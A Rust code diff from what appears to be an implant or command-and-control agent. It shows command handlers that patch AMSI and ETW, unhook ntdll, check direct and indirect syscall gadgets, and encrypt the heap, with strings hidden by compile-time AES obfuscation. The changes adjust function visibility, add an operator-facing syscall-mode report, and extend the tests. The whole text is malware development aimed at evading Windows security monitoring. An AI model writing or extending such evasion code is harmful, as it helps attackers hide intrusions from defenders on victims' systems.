@@ -5,19 +5,19 @@ use crate::agent::syscalls;
 use crate::strcrypt_rt;
 use strcrypt::aes_str;
 
-pub fn handle_patch_amsi() -> DispatchResult {
+pub(crate) fn handle_patch_amsi() -> DispatchResult {
     wrap_result(crate::agent::evasion::patch_amsi())
 }
 
-pub fn handle_patch_etw() -> DispatchResult {
+pub(crate) fn handle_patch_etw() -> DispatchResult {
     wrap_result(crate::agent::evasion::patch_etw())
 }
 
-pub fn handle_unhook_ntdll() -> DispatchResult {
+pub(crate) fn handle_unhook_ntdll() -> DispatchResult {
     wrap_result(crate::agent::evasion::unhook_ntdll())
 }
 
-pub fn handle_patch_all() -> DispatchResult {
+pub(crate) fn handle_patch_all() -> DispatchResult {
     let mut results = Vec::new();
     match crate::agent::evasion::patch_amsi() {
         Ok(msg) => results.push(format!("[+] {}", msg)),
@@ -34,8 +34,22 @@ pub fn handle_patch_all() -> DispatchResult {
     DispatchResult::Reply(results.join("\n"), String::new(), 0, AgentAction::None)
 }
 
-pub fn handle_syscall_check() -> DispatchResult {
+pub(crate) fn handle_syscall_check() -> DispatchResult {
     let mut lines = Vec::new();
+    // Syscall numbers and gadgets only exist on Windows; on other OSes
+    // every lookup below reports NOT FOUND, so say why up front.
+    #[cfg(not(target_os = "windows"))]
+    lines.push(aes_str!("[i] Direct syscalls are Windows-only; all lookups below will report NOT FOUND on this OS."));
+    // Surface the build-time syscall-mode flag so operators can see which
+    // mode this build selected (the nt_* wrappers take the matching
+    // `indirect` argument when used). try_load: a binary without a valid
+    // embedded config (unit tests) must report unknown, not exit.
+    let mode = match crate::agent::config::try_load() {
+        Some(c) if c.indirect_syscalls => aes_str!("indirect (gadget jmp)"),
+        Some(_) => aes_str!("direct"),
+        None => aes_str!("unknown (no embedded config)"),
+    };
+    lines.push(format!("{}: {}", aes_str!("Build syscall mode"), mode));
     let names = [
         aes_str!("NtAllocateVirtualMemory"), aes_str!("NtProtectVirtualMemory"),
         aes_str!("NtWriteVirtualMemory"), aes_str!("NtCreateThreadEx"),
@@ -78,7 +92,7 @@ use std::sync::Mutex;
 
 static HEAP_AES_STATE: Mutex<Option<([u8; 32], [u8; 12])>> = Mutex::new(None);
 
-pub fn handle_encrypt_heap_aes() -> DispatchResult {
+pub(crate) fn handle_encrypt_heap_aes() -> DispatchResult {
     use rand::{rngs::OsRng, RngCore};
     use zeroize::Zeroize;
 
@@ -117,7 +131,7 @@ pub fn handle_encrypt_heap_aes() -> DispatchResult {
     }
 }
 
-pub fn handle_decrypt_heap_aes() -> DispatchResult {
+pub(crate) fn handle_decrypt_heap_aes() -> DispatchResult {
     use zeroize::Zeroize;
 
     let state = match HEAP_AES_STATE.lock() {
@@ -186,9 +200,22 @@ mod tests {
 
     #[test]
     fn syscall_check_includes_text_section_line() {
+        // The fn must never exit or panic on Linux: the build-mode line
+        // reads the embedded config via try_load (None in test binaries).
         match handle_syscall_check() {
             DispatchResult::Reply(output, _, 0, _) => {
                 assert!(output.contains(".text section:"), "should include Gap-2 .text location");
+                assert!(output.contains("Build syscall mode:"), "should include the build syscall-mode line");
+                #[cfg(not(target_os = "windows"))]
+                {
+                    // A-25 preamble explains the NOT FOUND lines on Linux.
+                    assert!(output.contains("Direct syscalls are Windows-only"),
+                        "linux build must print the Windows-only preamble");
+                    // No embedded config in the test binary: unknown, and
+                    // crucially the process survived to assert at all.
+                    assert!(output.contains("unknown (no embedded config)"),
+                        "test binary has no embedded config");
+                }
             }
             _ => panic!("Expected Reply"),
         }
